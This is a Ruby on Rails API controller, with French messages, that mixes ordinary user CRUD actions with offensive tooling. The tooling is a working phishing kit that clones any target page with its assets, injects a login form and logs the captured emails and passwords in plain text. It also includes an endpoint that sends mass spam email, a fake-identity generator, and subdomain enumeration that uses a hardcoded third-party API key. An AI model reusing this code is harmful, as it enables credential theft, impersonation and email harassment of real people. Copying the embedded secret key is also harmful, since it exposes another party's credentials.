require 'resolv'
require 'net/http'
require 'uri'

class Api::V1::UsersController < ApplicationController
  before_action :set_user, only: %i[show edit update destroy]

  def index
    authorize model, :index?
    @users = params[:q].blank? ? scope : scope.search(params[:q])
    @users = @users.page(params[:page])

    render json: @users
  end

  def show
    authorize model, :show?
    render json: @user
  end

  def new
    @user = scope.new
    @roles = User::ROLES
    authorize @user, :create?
  end

  def create
    @user = User.new(user_params)
    authorize @user, :create?
  
    if @user.save
      UserMailer.welcome_email(@user).deliver_later
      log_action('create', 'User')
      render json: @user, status: :created
    else
      render json: { errors: @user.errors.full_messages }, status: :unprocessable_entity
    end
  end

  def edit
    authorize @user, :update?
  end

  def update
    authorize @user, :update?

    if @user.update(user_params)
      render json: @user
    else
      render json: { errors: @user.errors.full_messages }, status: :unprocessable_entity
    end
  end

  def destroy
    authorize @user, :destroy?
    @user.destroy!
    render json: { message: 'User deleted successfully' }, status: :ok
  end

  def check_email
    email = params[:email]
    user_exists = User.exists?(email: email)
    
    render json: { exists: user_exists }
  end

  def generate_fake_identity
    fake_name = Faker::Name.name
    fake_email = Faker::Internet.email

    render json: { name: fake_name, email: fake_email }
  end

  def generate_secure_password
    password = SecureRandom.base64(15)
    render json: { password: password }
  end

  def check_email_existence
    email = params[:email]

    if valid_email_format?(email) && domain_exists?(email)
      render json: { exists: true, message: 'Adresse mail potentiellement valide.' }
    else
      render json: { exists: false, message: 'Adresse mail invalide ou domaine inexistant.' }
    end
  end

  def is_common_password
    password = params[:password]

    if common_password?(password)
      render json: { common: true, message: 'Le mot de passe est courant.' }
    else
      render json: { common: false, message: 'Le mot de passe est sécurisé.' }
    end
  end

  def crawl_person_info
    name = params[:name]
    surname = params[:surname]
    render json: { message: "Informations pour #{name} #{surname}", name: name, surname: surname }
  end

  def get_person_info
    name = params[:name]
    person_info = fetch_wikipedia_data(name)
  
    if person_info[:error].nil?
      render json: {
        title: person_info[:title],
        snippet: person_info[:snippet],
        url: person_info[:url]
      }, status: :ok
    else
      render json: { error: person_info[:error] }, status: :not_found
    end
  end  

  def random_image
    image_url = "https://picsum.photos/800/600"
    render json: { image_url: image_url }
  end  

  def get_domains
    domain = params[:domain]
    subdomains = retrieve_subdomains(domain)

    if subdomains.any?
      render json: { subdomains: subdomains }, status: :ok
    else
      render json: { message: "Aucun sous-domaine trouvé." }, status: :not_found
    end
  end

  def spam_email
    email = params[:email]
    content = params[:content]
    count = params[:count].to_i

    if email.blank? || content.blank? || count <= 0
      render json: { error: "Tous les paramètres sont requis et le nombre d'envois doit être supérieur à zéro." }, status: :unprocessable_entity
      return
    end

    begin
      count.times do
        UserMailer.spam_email(email, content).deliver_now
      end
      render json: { message: "#{count} emails ont été envoyés avec succès à #{email}." }, status: :ok
    rescue StandardError => e
      render json: { error: "Une erreur s'est produite lors de l'envoi des emails : #{e.message}" }, status: :internal_server_error
    end
  end

  def download_phishing_target
    url = params[:url]
    return render json: { error: "URL est obligatoire" }, status: :unprocessable_entity if url.blank?
  
    begin
      domain_name = URI.parse(url).host
      folder_path = Rails.root.join('public', 'phishing_pages', domain_name)
      FileUtils.mkdir_p(folder_path)
  
      html_content = URI.open(url).read
      doc = Nokogiri::HTML(html_content)
  
      download_resources(doc, folder_path, url)
  
      inject_phishing_form(doc)
  
      html_file_path = File.join(folder_path, 'index.html')
      File.write(html_file_path, doc.to_html)
  
      render json: {
        message: "Page de phishing générée avec succès.",
        path: "/phishing_pages/#{domain_name}/index.html"
      }
    rescue StandardError => e
      render json: { error: "Erreur lors du téléchargement de la page : #{e.message}" }, status: :unprocessable_entity
    end
  end
  

  def create_phishing_page
    target_email = params[:email]
    fake_url = params[:fake_url]
    content = params[:content]
    input_path = Rails.root.join('public', 'downloaded_phishing.html')
    output_path = Rails.root.join('public', 'generated_phishing.html')
  
    PhishingPageGenerator.generate_phishing_page(target_email, fake_url, content, input_path, output_path)
  
    render json: { message: 'Page de phishing générée.', path: output_path }, status: :ok
  rescue => e
    render json: { error: "Erreur : #{e.message}" }, status: :unprocessable_entity
  end

  def capture
    email = params[:email]
    password = params[:password]
  
    Rails.logger.info("Email capturé : #{email}")
    Rails.logger.info("Mot de passe capturé : #{password}")
  
    render json: { message: "Données capturées avec succès." }, status: :ok
  end   

  def inject_phishing_form(doc)
    doc.at('body').add_child(<<-HTML)
      <form action="/api/v1/users/capture" method="POST" style="margin: 20px; padding: 20px; border: 1px solid red;">
        <label for="email">Email :</label>
        <input type="email" name="email" required>
        <label for="password">Mot de passe :</label>
        <input type="password" name="password" required>
        <button type="submit">Envoyer</button>
      </form>
    HTML
  end
  

  def retrieve_subdomains(domain)
    api_key = 'fTRMKRxZjR6co6rNG9cotUXQ5lCBAhBL'  
    url = URI("https://api.securitytrails.com/v1/domain/#{domain}/subdomains")

    http = Net::HTTP.new(url.host, url.port)
    http.use_ssl = true

    request = Net::HTTP::Get.new(url)
    request["APIKEY"] = api_key  

    response = http.request(request)
    data = JSON.parse(response.body)

    subdomains = data['subdomains'] || []
    subdomains.map { |subdomain| "#{subdomain}.#{domain}" } 
  rescue => e
    Rails.logger.error "Erreur lors de la récupération des sous-domaines: #{e.message}"
    []
  end

  def fetch_wikipedia_data(name)
    encoded_name = URI.encode_www_form_component(name)
    url = "https://en.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=#{encoded_name}&utf8=&formatversion=2"
  
    response = Net::HTTP.get(URI(url))
  
    response.force_encoding('UTF-8') if response.respond_to?(:force_encoding)
  
    puts "Réponse de l'API : #{response}" 
    json_response = JSON.parse(response)
  
    if json_response['query'] && json_response['query']['search'].any?
      page_info = json_response['query']['search'].first
      {
        title: page_info['title'],
        snippet: ActionController::Base.helpers.strip_tags(page_info['snippet']),
        url: "https://en.wikipedia.org/wiki/#{URI.encode_www_form_component(page_info['title'])}"
      }
    else
      { error: 'Aucune information trouvée' }
    end
  rescue StandardError => e
    puts "Erreur : #{e.message}" 
    { error: e.message }
  end  
  
  def common_password?(password)
    common_passwords = File.readlines(Rails.root.join('lib', 'seclists', '10k-most-common.txt')).map(&:chomp)
    common_passwords.include?(password)
  end

  def valid_email_format?(email)
    /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i.match?(email)
  end

  def domain_exists?(email)
    domain = email.split('@').last
    mx_records = Resolv::DNS.open { |dns| dns.getresources(domain, Resolv::DNS::Resource::IN::MX) }
    mx_records.any?
  rescue Resolv::ResolvError
    false
  end

  def download_resources(doc, folder_path, base_url)
    base_uri = URI.parse(base_url)

    doc.css('link[rel="stylesheet"]').each do |link|
      href = link['href']
      next unless href
  
      css_url = URI.join(base_url, href).to_s
      file_name = File.basename(URI.parse(css_url).path)
      file_path = File.join(folder_path, file_name)
  
      begin
        File.write(file_path, URI.open(css_url).read)
        link['href'] = file_name
      rescue StandardError => e
        Rails.logger.error "Erreur CSS: #{e.message}"
      end
    end
  
    doc.css('script[src]').each do |script|
      src = script['src']
      next unless src
  
      js_url = URI.join(base_url, src).to_s
      file_name = File.basename(URI.parse(js_url).path)
      file_path = File.join(folder_path, file_name)
  
      begin
        File.write(file_path, URI.open(js_url).read)
        script['src'] = file_name
      rescue StandardError => e
        Rails.logger.error "Erreur JS: #{e.message}"
      end
    end
  
    doc.css('img[src]').each do |img|
      src = img['src']
      next unless src
  
      img_url = URI.join(base_url, src).to_s
      file_name = File.basename(URI.parse(img_url).path)
      file_path = File.join(folder_path, file_name)
  
      begin
        File.write(file_path, URI.open(img_url).read)
        img['src'] = file_name
      rescue StandardError => e
        Rails.logger.error "Erreur image: #{e.message}"
      end
    end
  end

  def model
    User
  end

  def set_user
    @user = User.find(params[:id]) if params[:id]
  end

  def user_params
    params.require(:user).permit(:email, :password, :role)
  end
end